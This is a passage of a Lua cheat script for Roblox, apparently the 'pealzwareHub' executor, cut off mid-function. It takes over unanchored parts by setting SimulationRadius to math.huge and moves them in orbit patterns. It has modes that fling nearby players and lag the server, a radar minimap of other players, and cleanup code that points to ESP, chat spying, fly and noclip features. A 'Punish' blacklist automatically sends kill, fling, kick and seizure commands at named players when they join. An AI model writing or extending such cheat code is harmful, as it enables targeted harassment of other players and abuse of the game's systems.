    pcall(function() plr.SimulationRadius = math.huge end)
    for _, obj in ipairs(workspace:GetDescendants()) do
        pcall(function()
            if obj:IsA("BasePart") and not obj.Anchored
                and game.Players:GetPlayerFromCharacter(obj.Parent) == nil
                and obj.Parent ~= char
                and obj ~= hrp
                and (obj.Position - hrp.Position).Magnitude <= radius then
                _pcGrabPart(obj)
            end
        end)
    end
end

local function _pcUpdate(dt)
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    _pcAngle = _pcAngle + dt * _pcSpeed * 0.5
    _pcWaveT = _pcWaveT + dt * _pcSpeed * 0.3

    local parts = {}
    local _stale = {}
    for p, d in pairs(_pcGrabbed) do
        if p.Parent and d.bp.Parent then
            table.insert(parts, p)
        else
            table.insert(_stale, p)
        end
    end
    for _, p in ipairs(_stale) do
        local d = _pcGrabbed[p]
        if d then
            pcall(function() d.bp:Destroy() end)
            pcall(function() d.bg:Destroy() end)
        end
        _pcGrabbed[p] = nil
    end
    if #parts == 0 then return end

    pcall(function() plr.SimulationRadius = math.huge end)

    local center = hrp.Position + Vector3.new(0, 3, 0)
    local n      = #parts
    local rs     = _pcRingSize

    if _pcAutoGrab then
        _pcGrabNearby(_pcAutoRad)
    end

    for i, part in ipairs(parts) do
        local data = _pcGrabbed[part]
        if not data then continue end
        local a = (i / n) * math.pi * 2
        local target

        if _pcMode == "origin" then
            target = center
        elseif _pcMode == "ring" then
            target = center + Vector3.new(math.cos(a + _pcAngle) * rs, 0, math.sin(a + _pcAngle) * rs)
        elseif _pcMode == "orbit" then
            target = center + Vector3.new(math.cos(_pcAngle + a) * rs, math.sin(_pcAngle * 0.7 + i) * 4, math.sin(_pcAngle + a) * rs)
        elseif _pcMode == "wave" then
            target = center + Vector3.new((i - n/2) * 2.5, math.sin(_pcWaveT + i * 0.6) * 5, 0)
        elseif _pcMode == "tilt" then
            target = center + Vector3.new(math.cos(a) * rs, math.sin(a) * rs * 0.6, math.sin(a) * rs * 0.4)
        elseif _pcMode == "piSquared" then
            target = center + Vector3.new(math.cos(a) * rs, math.cos(a * 1.618) * rs * 0.5, math.sin(a) * rs)
        elseif _pcMode == "twoCircles" then
            local layer = (i % 2 == 0) and rs * 0.4 or -rs * 0.4
            target = center + Vector3.new(math.cos(a + _pcAngle) * rs, layer, math.sin(a + _pcAngle) * rs)
        elseif _pcMode == "bloom" then
            local phi   = math.acos(1 - 2 * (i / n))
            local theta = math.pi * (1 + math.sqrt(5)) * i
            target = center + Vector3.new(math.sin(phi)*math.cos(theta)*rs, math.sin(phi)*math.sin(theta)*rs, math.cos(phi)*rs)
        elseif _pcMode == "square" then
            local sq  = math.ceil(math.sqrt(n))
            local row = math.floor((i-1)/sq)
            local col = (i-1) % sq
            target = center + Vector3.new((col - sq/2) * 3.5, 0, (row - sq/2) * 3.5)
        else
            target = center
        end

        if _pcEntropy then
            target = target + Vector3.new(math.random(-30,30), math.random(-30,30), math.random(-30,30))
        end

        if _pcRealLag then
            for _ = 1, 15 do
                pcall(function()
                    data.bp.Position = target + Vector3.new(math.random(-200,200), math.random(-200,200), math.random(-200,200))
                end)
            end
        end

        pcall(function() data.bp.Position = target end)

        if _pcRedColor then
            pcall(function() part.BrickColor = BrickColor.new("Bright red") end)
        end
        if _pcAnchor then
            pcall(function() part.Anchored = true end)
        end
        if _pcNoclip then
            pcall(function() part.CanCollide = false end)
        end
        if _pcChaos then
            for _, tp in ipairs(game.Players:GetPlayers()) do
                if tp ~= plr and tp.Character then
                    local tHRP = tp.Character:FindFirstChild("HumanoidRootPart")
                    if tHRP and (tHRP.Position - part.Position).Magnitude < 12 then
                        pcall(function()
                            local fv = Instance.new("BodyVelocity")
                            fv.MaxForce = Vector3.new(1e9,1e9,1e9)
                            fv.Velocity = (tHRP.Position - part.Position).Unit * 200
                            fv.Parent = tHRP
                            game.Debris:AddItem(fv, 0.1)
                        end)
                    end
                end
            end
        end
    end
end

local PatternsGroup  = Tabs.Parts:CreateModule({Name = 'Patterns'})
local PartsSetGroup  = Tabs.Parts:CreateModule({Name = 'Settings & Advanced'})

local function _pcSetMode(m)
    _pcMode = m
end

local _pcPatternMap = {
    ['Origin']          = 'origin',
    ['Pythagoras Ring'] = 'ring',
    ['Sigma Orbit']     = 'orbit',
    ['Alpha Wave']      = 'wave',
    ['Pi Tilt']         = 'tilt',
    ['Pi Squared']      = 'piSquared',
    ['Two Circles']     = 'twoCircles',
    ['Bloom Cage']      = 'bloom',
    ['Square²']         = 'square',
}
PatternsGroup:CreateDropdown({
    Name = 'Pattern',
    List = { 'Origin', 'Pythagoras Ring', 'Sigma Orbit', 'Alpha Wave', 'Pi Tilt', 'Pi Squared', 'Two Circles', 'Bloom Cage', 'Square²' },
    Default = 'Origin',
    Tooltip = 'Select how grabbed parts orbit around you',
}):OnChanged(function(v)
    if not v then return end
    _pcMode = _pcPatternMap[v] or 'origin'
end)

PatternsGroup:CreateDivider()
PatternsGroup:CreateSlider({
    Name = 'Ring Size', Min = 0, Max = 150, Default = 10, Increment = 1,
}):OnChanged(function(v) _pcRingSize = v end)

PartsSetGroup:CreateSlider({
    Name = 'Pick Up Radius', Min = 0, Max = 2000, Default = 500, Increment = 1,
}):OnChanged(function(v) _pcPickRad = v end)

PartsSetGroup:CreateSlider({
    Name = 'Speed', Min = 1, Max = 500, Default = 10, Increment = 1,
}):OnChanged(function(v) _pcSpeed = v end)

PartsSetGroup:CreateToggle({ Name = 'Use CFrame', Default = false }):OnChanged(function(v) _pcUseCFrame = v end)
PartsSetGroup:CreateToggle({ Name = 'Noclip',     Default = false }):OnChanged(function(v) _pcNoclip = v end)
PartsSetGroup:CreateToggle({ Name = 'Auto Grab All Objects', Default = false }):OnChanged(function(v) _pcAutoGrab = v end)

PartsSetGroup:CreateSlider({
    Name = 'Auto Grab Radius', Min = 100, Max = 2000, Default = 100, Increment = 1,
}):OnChanged(function(v) _pcAutoRad = v end)

PartsSetGroup:CreateToggle({ Name = 'Entropy (Lag Mode)', Default = false }):OnChanged(function(v) _pcEntropy = v end)
PartsSetGroup:CreateToggle({ Name = 'Real Lag (1000 Up)', Default = false }):OnChanged(function(v) _pcRealLag = v end)
PartsSetGroup:CreateToggle({ Name = 'Detailed Blocks',    Default = false })
PartsSetGroup:CreateToggle({ Name = 'Red Color',          Default = false }):OnChanged(function(v) _pcRedColor = v end)

PartsSetGroup:CreateDivider()
PartsSetGroup:CreateToggle({ Name = 'Chaos (Fling)',          Default = false }):OnChanged(function(v) _pcChaos = v end)

PartsSetGroup:CreateDivider()
PartsSetGroup:CreateButton({
    Name = 'Grab Nearby Parts',
    Function = function()
        _pcGrabNearby(_pcPickRad)
        Library:Notify("Grabbed " .. (function() local c=0 for _ in pairs(_pcGrabbed) do c=c+1 end return c end)() .. " parts", 3)
    end
})
PartsSetGroup:CreateButton({
    Name = 'Release All',
    Function = function()
        _pcRelease()
        Library:Notify("Released all parts", 2)
    end
})

PartsSetGroup:CreateToggle({
    Name = 'Activate Controller',
    Default = false,
    Tooltip = 'Run part pattern controller every frame'
}):OnChanged(function(val)
    _pcActive = val
    if val then
        if _pcConn then _pcConn:Disconnect() end
        _pcConn = RunService.Heartbeat:Connect(function(dt)
            if not _pcActive then return end
            pcall(_pcUpdate, dt)
        end)
        _pcControllerConn = _pcConn
        Library:Notify("Parts controller active", 3)
    else
        if _pcConn then _pcConn:Disconnect(); _pcConn = nil end
        _pcControllerConn = nil
        Library:Notify("Parts controller stopped", 2)
    end
end)

end -- /══ Parts Controller ══

ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ 'MenuKeybind', 'PlayersESP', 'BuildingsESP', 'ToolsESP' })
ThemeManager:SetFolder('pealzwareHub')
SaveManager:SetFolder('pealzwareHub')

ThemeManager:ApplyToTab(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)

-- ══ Settings standalone toggle button ══
-- Hide the Settings sidebar nav entry; expose it as a popout-style toggle
-- button that sits alongside Servers / Enlighten / Builds / Special.
task.defer(function()
    pcall(function()
        if Tabs.Settings.Button and Tabs.Settings.Button.Object then
            Tabs.Settings.Button.Object.Visible = false
        end

        local _sWin = Tabs.Settings.Object
        if not _sWin then return end
        _sWin.Visible = false

        local _tsS    = game:GetService('TweenService')
        local _sSlot  = _popoutToggleCount
        _popoutToggleCount = _popoutToggleCount + 1

        local _sOuter = Instance.new('Frame')
        _sOuter.Name  = 'PopoutToggle_Settings'
        _sOuter.Size  = UDim2.fromOffset(82, 30)
        _sOuter.Position = UDim2.new(1, -92, 0, 6 + _sSlot * 36)
        _sOuter.BackgroundColor3 = Library.Color.Dark(Library.Palette.Main, 0.02)
        _sOuter.BorderSizePixel = 0
        _sOuter.ZIndex = 10
        _sOuter.Parent = Library.ScaledGui
        Library.Utility.AddBlur(_sOuter)
        Library.Utility.AddCorner(_sOuter, UDim.new(0, 7))

        local _sStroke = Instance.new('UIStroke')
        _sStroke.Color = Library.Palette.AccentColor
        _sStroke.Thickness = 1.2
        _sStroke.Transparency = 0.45
        _sStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        _sStroke.Parent = _sOuter

        local _sBtn = Instance.new('TextButton')
        _sBtn.Size = UDim2.fromScale(1, 1)
        _sBtn.BackgroundTransparency = 1
        _sBtn.BorderSizePixel = 0
        _sBtn.AutoButtonColor = false
        _sBtn.Text = ''
        _sBtn.ZIndex = 11
        _sBtn.Parent = _sOuter

        local _sLabel = Instance.new('TextLabel')
        _sLabel.Size = UDim2.fromScale(1, 1)
        _sLabel.BackgroundTransparency = 1
        _sLabel.Text = '\xe2\x9a\x99  Settings'
        _sLabel.TextColor3 = Library.Palette.Text
        _sLabel.TextSize = 12
        _sLabel.FontFace = Library.Palette.FontSemiBold or Library.Palette.Font
        _sLabel.TextXAlignment = Enum.TextXAlignment.Center
        _sLabel.ZIndex = 12
        _sLabel.Parent = _sOuter

        local _sDot = Instance.new('Frame')
        _sDot.Size = UDim2.fromOffset(4, 4)
        _sDot.Position = UDim2.fromOffset(6, 13)
        _sDot.BackgroundColor3 = Library.Palette.AccentColor
        _sDot.BackgroundTransparency = 1
        _sDot.BorderSizePixel = 0
        _sDot.ZIndex = 13
        _sDot.Parent = _sOuter
        Library.Utility.AddCorner(_sDot, UDim.new(1, 0))

        local _sActive = false
        local function _sSetActive(state)
            _sActive = state
            _tsS:Create(_sDot,    TweenInfo.new(0.15), { BackgroundTransparency = state and 0 or 1 }):Play()
            _tsS:Create(_sStroke, TweenInfo.new(0.15), { Transparency = state and 0.1 or 0.45 }):Play()
            _tsS:Create(_sLabel,  TweenInfo.new(0.15), {
                TextColor3 = state and Library.Palette.AccentColor or Library.Palette.Text
            }):Play()
        end

        -- Capture the panel size once the window has been laid out
        local _sPanelSize = nil
        local function _getPanelSize()
            if _sPanelSize then return _sPanelSize end
            local s = _sWin.Size
            _sPanelSize = (s.Y.Offset > 80) and s or UDim2.fromOffset(220, 560)
            return _sPanelSize
        end

        _sBtn.MouseButton1Click:Connect(function()
            local sz = _getPanelSize()
            if _sWin.Visible then
                _tsS:Create(_sWin,
                    TweenInfo.new(0.18, Enum.EasingStyle.Quart, Enum.EasingDirection.In),
                    { BackgroundTransparency = 1,
                      Size = UDim2.fromOffset(sz.X.Offset, sz.Y.Offset - 16) }):Play()
                task.delay(0.18, function()
                    _sWin.Visible = false
                    _sWin.BackgroundTransparency = 0
                    _sWin.Size = sz
                end)
                _sSetActive(false)
            else
                _sWin.Size = UDim2.fromOffset(sz.X.Offset, sz.Y.Offset - 16)
                _sWin.BackgroundTransparency = 1
                _sWin.Visible = true
                if not Tabs.Settings.Expanded then
                    Tabs.Settings.Expanded = true
                    local _kids = _sWin:FindFirstChild('Children')
                    if _kids then _kids.Visible = true end
                    _sWin.Size = UDim2.fromOffset(220, 601)
                    _sPanelSize = _sWin.Size
                end
                _tsS:Create(_sWin,
                    TweenInfo.new(0.22, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
                    { BackgroundTransparency = 0, Size = sz }):Play()
                _sSetActive(true)
            end
        end)
        _sBtn.MouseEnter:Connect(function()
            _tsS:Create(_sOuter, TweenInfo.new(0.1),
                { BackgroundColor3 = Library.Color.Light(Library.Palette.Main, 0.12) }):Play()
            _tsS:Create(_sStroke, TweenInfo.new(0.1), { Transparency = 0.2 }):Play()
        end)
        _sBtn.MouseLeave:Connect(function()
            _tsS:Create(_sOuter, TweenInfo.new(0.12),
                { BackgroundColor3 = Library.Color.Dark(Library.Palette.Main, 0.02) }):Play()
            _tsS:Create(_sStroke, TweenInfo.new(0.12),
                { Transparency = _sActive and 0.1 or 0.45 }):Play()
        end)
        _sBtn.MouseButton1Down:Connect(function()
            _tsS:Create(_sOuter, TweenInfo.new(0.05),
                { BackgroundColor3 = Library.Color.Light(Library.Palette.Main, 0.05) }):Play()
        end)
        _sBtn.MouseButton1Up:Connect(function()
            _tsS:Create(_sOuter, TweenInfo.new(0.1),
                { BackgroundColor3 = Library.Color.Light(Library.Palette.Main, 0.12) }):Play()
        end)
    end)
end)

-- ══ Minimap Overlay ══════════════════════════════════════════════════════════
-- A top-down minimap similar to Xaero's Minimap in Minecraft.
-- Shows all players as coloured dots on a circular radar.
do
    local _mm = nil        -- ScreenGui
    local _mmConn = nil    -- update connection
    local _mmEnabled = false
    local _MM_SIZE  = 180  -- px diameter
    local _MM_RANGE = 200  -- stud radius shown on map
    local _mmDots   = {}   -- [player] = Frame dot

    local function _mmCreate()
        if _mm then return end

        local gui = Instance.new("ScreenGui")
        gui.Name           = "PealzwareMinimap"
        gui.IgnoreGuiInset = true
        gui.ResetOnSpawn   = false
        gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        gui.DisplayOrder   = 8
        pcall(function() gui.Parent = CoreGui end)
        _mm = gui

        -- Outer container (draggable)
        local outer = Instance.new("Frame")
        outer.Name              = "Outer"
        outer.Size              = UDim2.fromOffset(_MM_SIZE + 4, _MM_SIZE + 4)
        outer.Position          = UDim2.new(1, -(_MM_SIZE + 14), 0, 14)
        outer.BackgroundColor3  = Color3.fromRGB(8, 8, 12)
        outer.BackgroundTransparency = 0.08
        outer.BorderSizePixel   = 0
        outer.ClipsDescendants  = true
        outer.Parent            = gui
        Instance.new("UICorner", outer).CornerRadius = UDim.new(1, 0)
        local stroke = Instance.new("UIStroke")
        stroke.Color       = Library and Library.Palette and Library.Palette.AccentColor or Color3.fromRGB(0, 160, 255)
        stroke.Thickness   = 1.5
        stroke.Transparency = 0.3
        stroke.Parent      = outer
        Library and Library.Utility and pcall(function() Library.Utility.MakeDraggable(outer) end)

        -- Compass N label
        local north = Instance.new("TextLabel")
        north.BackgroundTransparency = 1
        north.Size     = UDim2.fromOffset(_MM_SIZE, 16)
        north.Position = UDim2.fromOffset(2, 2)
        north.Font     = Enum.Font.GothamBold
        north.TextSize = 10
        north.TextColor3 = Color3.fromRGB(255, 80, 80)
        north.Text     = "N"
        north.ZIndex   = 6
        north.Parent   = outer

        -- Map frame (circular clip)
        local mapFrame = Instance.new("Frame")
        mapFrame.Name              = "MapFrame"
        mapFrame.Size              = UDim2.fromOffset(_MM_SIZE, _MM_SIZE)
        mapFrame.Position          = UDim2.fromOffset(2, 2)
        mapFrame.BackgroundColor3  = Color3.fromRGB(14, 18, 24)
        mapFrame.BackgroundTransparency = 0.05
        mapFrame.BorderSizePixel   = 0
        mapFrame.ClipsDescendants  = true
        mapFrame.ZIndex            = 2
        mapFrame.Parent            = outer
        Instance.new("UICorner", mapFrame).CornerRadius = UDim.new(1, 0)

        -- Cross-hair lines
        for _, axis in ipairs({"H","V"}) do
            local line = Instance.new("Frame")
            line.BackgroundColor3  = Color3.fromRGB(255,255,255)
            line.BackgroundTransparency = 0.82
            line.BorderSizePixel   = 0
            line.ZIndex            = 3
            if axis == "H" then
                line.Size     = UDim2.new(1, 0, 0, 1)
                line.Position = UDim2.new(0, 0, 0.5, 0)
            else
                line.Size     = UDim2.new(0, 1, 1, 0)
                line.Position = UDim2.new(0.5, 0, 0, 0)
            end
            line.Parent = mapFrame
        end

        -- Self dot (white, centre)
        local selfDot = Instance.new("Frame")
        selfDot.Name              = "SelfDot"
        selfDot.Size              = UDim2.fromOffset(8, 8)
        selfDot.AnchorPoint       = Vector2.new(0.5, 0.5)
        selfDot.Position          = UDim2.new(0.5, 0, 0.5, 0)
        selfDot.BackgroundColor3  = Color3.fromRGB(255, 255, 255)
        selfDot.BorderSizePixel   = 0
        selfDot.ZIndex            = 5
        selfDot.Parent            = mapFrame
        Instance.new("UICorner", selfDot).CornerRadius = UDim.new(1, 0)

        -- Range label bottom-right
        local rangeLbl = Instance.new("TextLabel")
        rangeLbl.Name   = "RangeLbl"
        rangeLbl.BackgroundTransparency = 1
        rangeLbl.Size   = UDim2.fromOffset(_MM_SIZE - 4, 14)
        rangeLbl.Position = UDim2.fromOffset(2, _MM_SIZE - 14)
        rangeLbl.Font   = Enum.Font.Gotham
        rangeLbl.TextSize = 9
        rangeLbl.TextXAlignment = Enum.TextXAlignment.Right
        rangeLbl.TextColor3 = Color3.fromRGB(140, 140, 165)
        rangeLbl.Text   = _MM_RANGE .. " studs"
        rangeLbl.ZIndex = 6
        rangeLbl.Parent = outer

        gui._mapFrame = mapFrame
        gui._stroke   = stroke
    end

    local function _mmGetOrCreateDot(player)
        local dot = _mmDots[player]
        if dot and dot.Parent then return dot end
        if not _mm then return nil end
        local mapFrame = _mm._mapFrame
        if not mapFrame then return nil end

        dot = Instance.new("Frame")
        dot.Size             = UDim2.fromOffset(6, 6)
        dot.AnchorPoint      = Vector2.new(0.5, 0.5)
        dot.BorderSizePixel  = 0
        dot.ZIndex           = 4
        dot.Parent           = mapFrame
        Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

        -- Name label on hover
        local lbl = Instance.new("TextLabel")
        lbl.BackgroundTransparency = 1
        lbl.Size       = UDim2.fromOffset(60, 12)
        lbl.Position   = UDim2.fromOffset(7, -5)
        lbl.Font       = Enum.Font.GothamSemibold
        lbl.TextSize   = 9
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.TextColor3 = Color3.fromRGB(220, 220, 235)
        lbl.Text       = player.DisplayName
        lbl.ZIndex     = 5
        lbl.Parent     = dot

        _mmDots[player] = dot
        return dot
    end

    local function _mmRemoveDot(player)
        if _mmDots[player] then
            pcall(function() _mmDots[player]:Destroy() end)
            _mmDots[player] = nil
        end
    end

    local function _mmStartLoop()
        if _mmConn then _mmConn:Disconnect() end
        _mmConn = RunService.Heartbeat:Connect(function()
            if not _mmEnabled or not _mm then return end
            local myChar = plr.Character
            local myHRP  = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if not myHRP then return end
            local myPos = myHRP.Position

            -- Update accent colour to match GUI
            if Library and Library.Palette then
                local accent = Library.Palette.AccentColor
                _mm._stroke.Color = accent
            end

            local half = _MM_SIZE / 2
            local allPlayers = Players:GetPlayers()
            local seen = {}

            for _, p in ipairs(allPlayers) do
                if p == plr then continue end
                local char = p.Character
                local hrp  = char and char:FindFirstChild("HumanoidRootPart")
                if not hrp then _mmRemoveDot(p); continue end

                local rel   = hrp.Position - myPos
                local normX = math.clamp(rel.X / _MM_RANGE, -1, 1)
                local normZ = math.clamp(rel.Z / _MM_RANGE, -1, 1)
                -- Centre = 0.5, so offset in pixels
                local px = half + normX * half
                local pz = half + normZ * half
                -- Clamp to circle
                local dx  = normX * half
                local dz  = normZ * half
                local len = math.sqrt(dx*dx + dz*dz)
                if len > half then
                    dx = dx / len * (half - 3)
                    dz = dz / len * (half - 3)
                    px = half + dx
                    pz = half + dz
                end

                local dot = _mmGetOrCreateDot(p)
                if dot then
                    dot.Position = UDim2.fromOffset(px, pz)
                    -- Colour by team if any, otherwise accent
                    local col = Color3.fromRGB(80, 180, 255)
                    if confirmedHubUsers and confirmedHubUsers[p] then
                        col = Color3.fromRGB(255, 200, 50)  -- hub user = gold
                    end
                    if p == localplr then col = Color3.new(1,1,1) end
                    dot.BackgroundColor3 = col
                end
                seen[p] = true
            end

            -- Remove dots for players who left
            for p in pairs(_mmDots) do
                if not seen[p] then _mmRemoveDot(p) end
            end
        end)
    end

    local function _mmStopLoop()
        if _mmConn then _mmConn:Disconnect(); _mmConn = nil end
    end

    local function _mmDestroy()
        _mmStopLoop()
        for p in pairs(_mmDots) do _mmRemoveDot(p) end
        if _mm then pcall(function() _mm:Destroy() end); _mm = nil end
    end

    -- Add minimap as an overlay button in the overlays bar
    -- We wait until the overlay system is ready (post-init)
    task.defer(function()
        pcall(function()
            local mmOverlay = Library:CreateOverlay({
                Name     = "Minimap",
                Icon     = getcustomasset and getcustomasset('pealzware/assets/new/rendericon.png') or '',
                Size     = UDim2.fromOffset(16, 16),
                Position = UDim2.fromOffset(12, 13),
                Function = function(enabled)
                    _mmEnabled = enabled
                    if enabled then
                        _mmCreate()
                        if _mm then _mm.Enabled = true end
                        _mmStartLoop()
                    else
                        if _mm then _mm.Enabled = false end
                        _mmStopLoop()
                    end
                end
            })

            if mmOverlay then
                -- Range slider inside overlay panel
                local rangeSlider = mmOverlay:CreateSlider({
                    Name    = 'Range (studs)',
                    Min     = 50,
                    Max     = 1000,
                    Decimal = 0,
                    Default = 200,
                    Function = function(val)
                        _MM_RANGE = val
                        -- Update label
                        if _mm then
                            local lbl = _mm:FindFirstChild("Outer") and _mm.Outer:FindFirstChild("RangeLbl")
                            if lbl then lbl.Text = val .. " studs" end
                        end
                    end
                })
            end
        end)
    end)

    Library:OnUnload(function()
        _mmDestroy()
    end)
end
-- ══ End Minimap Overlay ═══════════════════════════════════════════════════════

 function cleanupBoombox()
    if bbsbox then
        bbsbox:Destroy()
    end
    
    for _, obj in pairs(CoreGui:GetChildren()) do
        if obj.Name == "BoomboxHighlight" then
            obj:Destroy()
        end
    end
end

Library:OnUnload(function()
    _G.ROMAZDEV_HUB_LOADED = false
    Library.Unloaded = true
    cleanupEnhancedChat()

    if not _commandServiceState.keepAliveOnUnload then
        pcall(sendRelayLeave)
        _relayHeartbeatRunning = false
        if _commandServiceState.stop then
            _commandServiceState.stop(false)
        end
    end

    if chatSpyConnection then
        chatSpyConnection:Disconnect()
        chatSpyConnection = nil
    end

    if _muteBoomboxConn then
        _muteBoomboxConn:Disconnect()
        _muteBoomboxConn = nil
    end

    for _, conn in pairs(hubRespawnConns) do
        pcall(function() conn:Disconnect() end)
    end
    hubRespawnConns = {}

    for userId, conns in pairs(_enlWatchConns) do
        disconnectConnectionList(conns)
        _enlWatchConns[userId] = nil
    end

    if autoScanThread then
        pcall(function() task.cancel(autoScanThread) end)
        autoScanThread = nil
    end

    if _touchFlingConn then
        _touchFlingConn:Disconnect()
        _touchFlingConn = nil
    end
    _disconnectTouchFlingPartConns()

    if _pcControllerConn then
        _pcControllerConn:Disconnect()
        _pcControllerConn = nil
    end

    stopStash = true

    -- Clone Tool cleanup
pcall(function()
    if _ctDragGui and _ctDragGui.Parent then
        _ctDragGui:Destroy()
        _ctDragGui = nil
    end
end)
pcall(function()
    if _etbGui and _etbGui.Parent then
        _etbGui:Destroy()
        _etbGui = nil
    end
end)
pcall(function()
    if _ctHandles and _ctHandles.Parent then
        _ctHandles:Destroy()
        _ctHandles = nil
    end
end)
pcall(function()
    if _ctPrimPart and _ctPrimPart.Parent then
        _ctPrimPart:Destroy()
        _ctPrimPart = nil
    end
end)
pcall(function()
    for part, sb in pairs(_ctSelBoxes) do
        if sb and sb.Parent then sb:Destroy() end
    end
    _ctSelBoxes = {}
    _ctSel      = {}
end)
_ctBuilding = false
_ctDragging = false

    for _, player in ipairs(Players:GetPlayers()) do
        pcall(function()
            if player.Character then
                local head = player.Character:FindFirstChild("Head")
                if head then
                    for _, child in ipairs(head:GetChildren()) do
                        if child:IsA("BillboardGui") then
                            child:Destroy()
                        end
                    end
                end
            end
        end)
    end

    pcall(function()
        if stashPlatform and stashPlatform.Parent then
            stashPlatform:Destroy()
            getgenv().invisstashplatform = nil
        end
    end)

    cleanupBoombox()

if _toolsESPAddConn then _toolsESPAddConn:Disconnect() end
if _toolsESPRemoveConn then _toolsESPRemoveConn:Disconnect() end
for _, v in pairs(toolsESPObjects) do pcall(function() v:Destroy() end) end
for _, data in pairs(toolsESPLabels) do pcall(function() data.bb:Destroy() end) end

    for _, connection in pairs(auraConnections) do
        if connection then
            connection:Disconnect()
        end
    end

    for name, connection in pairs(antiConnections) do
        if connection then
            connection:Disconnect()
            antiConnections[name] = nil
        end
    end

    workspace.FallenPartsDestroyHeight = originalDestroyHeight

if fakeTimeConn then fakeTimeConn:Disconnect(); fakeTimeConn = nil end
if fakeTimeWatchConn then fakeTimeWatchConn:Disconnect(); fakeTimeWatchConn = nil end
if fakeTimeDescConn then fakeTimeDescConn:Disconnect(); fakeTimeDescConn = nil end
if fakeTimeLabelConns then
    for i = #fakeTimeLabelConns, 1, -1 do
        local conn = fakeTimeLabelConns[i]
        if conn then conn:Disconnect() end
        fakeTimeLabelConns[i] = nil
    end
end

    if _permDeleteSoundConn then
        _permDeleteSoundConn:Disconnect()
        _permDeleteSoundConn = nil
    end

    if _abfAddConn then
        _abfAddConn:Disconnect()
        _abfAddConn = nil
    end

    if _abfDetectConn then
        _abfDetectConn:Disconnect()
        _abfDetectConn = nil
    end

    if antiAfkConnection then
        antiAfkConnection:Disconnect()
        antiAfkConnection = nil
    end
    if antiAfkWindowFocusConn then
        antiAfkWindowFocusConn:Disconnect()
        antiAfkWindowFocusConn = nil
    end
    antiAfkEnabled = false
    antiAfkPanel = nil

    if autoRejoinConn then
        autoRejoinConn:Disconnect()
        autoRejoinConn = nil
    end

    setBoostFPSEnabled(false)

    StopAntiVoid()
    StopFlying()
    
    RemoveAllESP()
    StopESPUpdateLoop()
    for _, v in pairs(toolsESPObjects) do pcall(function() v:Destroy() end) end
    for _, data in pairs(toolsESPLabels) do pcall(function() data.bb:Destroy() end) end

    if deleteAuraConnection then
        deleteAuraConnection:Disconnect()
    end
    
    if toxifyAuraConnection then
        toxifyAuraConnection:Disconnect()
    end
    
    if toolManagementConnection then
        toolManagementConnection:Disconnect()
        toolManagementConnection = nil
    end

    if noclipConn then
        noclipConn:Disconnect()
        noclipConn = nil
    end

    _charStatsReady = false
    autoPickupEnabled = false
    autoDropEnabled = false
    pcall(function()
        if plr.Character then
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.WalkSpeed = 16
                pcall(function() hum.JumpPower = 50 end)
                pcall(function() hum.JumpHeight = 7.2 end)
            end
        end
    end)

    if cubechild then
        cubechild:Disconnect()
    end

    disconnectConnectionList(scriptConnections)

    coroutine.wrap(function()
        for i,v in pairs(tools) do
            local s,e = pcall(function()
                for i,v in pairs(v) do
                    if v and v:IsDescendantOf(game) then
                        v:Destroy()
                        task.wait()
                        task.wait()
                    end
                end
            end)
            if not s then warn(e) end
        end
    end)()

end)

end -- /══ Antis Setup ══

do -- ══ Auto Commands (Punish Tab) ══
-- ─── State ────────────────────────────────────────────────────────────
local blacklistEnabled       = false
local blacklistJoinDelay     = 2
local blacklistCmdDelay      = 0.4
local blacklistedPlayers     = {}
local autoSelfJoinEnabled    = false
local autoSelfJoinCmds       = {}
local autoOnPlayerJoinEnabled  = false
local autoOnPlayerJoinCmds   = {}
local autoOnPlayerLeaveEnabled = false
local autoOnPlayerLeaveCmds  = {}
local autoCmdConnections     = {}

local BlacklistCountLabel    = nil
local BlacklistViewDropdown  = nil
local AutoSelfCmdCountLabel  = nil
local AutoJoinCmdCountLabel  = nil
local AutoLeaveCmdCountLabel = nil
local BlacklistPlayerNameInput = nil
local BlacklistActionSelect  = nil
local BlacklistExtraInput    = nil
local BlacklistJoinDelaySlider = nil
local BlacklistRepeatSlider  = nil
local AutoJoinCmdTextInput   = nil
local AutoJoinPresetDropdown = nil
local AutoSelfCmdTextInput   = nil
local AutoSelfDelaySlider    = nil
local AutoSelfPresetDropdown = nil
local AutoLeaveCmdTextInput  = nil
local AutoLeavePresetDropdown = nil
local QuickBlacklistNameInput = nil

local allAutoActions = {
    "jail","freeze","glitch","fling","kill","blind",
    "toxify","vampire","drag","mute","invisible",
    "bring","reset","speed 1","jumppower 0","anchor",
    "clone","explode","shrink","noclip","god","ungod",
    "kick","seizure","fly"
}

-- ─── Core helpers ─────────────────────────────────────────────────────
local function autoCmdSend(cmd)
    sendGeneralChatMessage(";" .. cmd)
end
local function autoCmdSendTarget(cmd, targetName)
    autoCmdSend(cmd .. " " .. targetName)
end

-- ─── Blacklist execution ──────────────────────────────────────────────
local function runBlacklistOnPlayer(player)
    if not blacklistEnabled then return end
    local bld = blacklistedPlayers[player.Name:lower()]
    if not bld or not bld.enabled then return end
    task.spawn(function()
        task.wait(bld.joinDelay or blacklistJoinDelay)
        Library:Notify("BLACKLIST: " .. player.Name .. " joined! Executing actions...", 6)
        for rep = 1, (bld.repeatCount or 1) do
            if rep > 1 then task.wait(bld.repeatDelay or 5) end
            for _, act in ipairs(bld.actions) do
                if blacklistEnabled and bld.enabled then
                    pcall(function() autoCmdSendTarget(act, player.Name) end)
                    task.wait(blacklistCmdDelay)
                end
            end
        end
    end)
end

-- ─── Auto self-join ───────────────────────────────────────────────────
local function runAutoSelfJoinCmds()
    if not autoSelfJoinEnabled then return end
    task.spawn(function()
        task.wait(3)
        for _, cd in ipairs(autoSelfJoinCmds) do
            if cd.enabled then
                task.wait(cd.delay or 0.5)
                autoCmdSend(cd.cmd)
            end
        end
    end)
end

-- ─── Auto on-player-join ──────────────────────────────────────────────
local function runAutoOnPlayerJoinCmds(player)
    if not autoOnPlayerJoinEnabled then return end
    if player == plr then return end
    task.spawn(function()
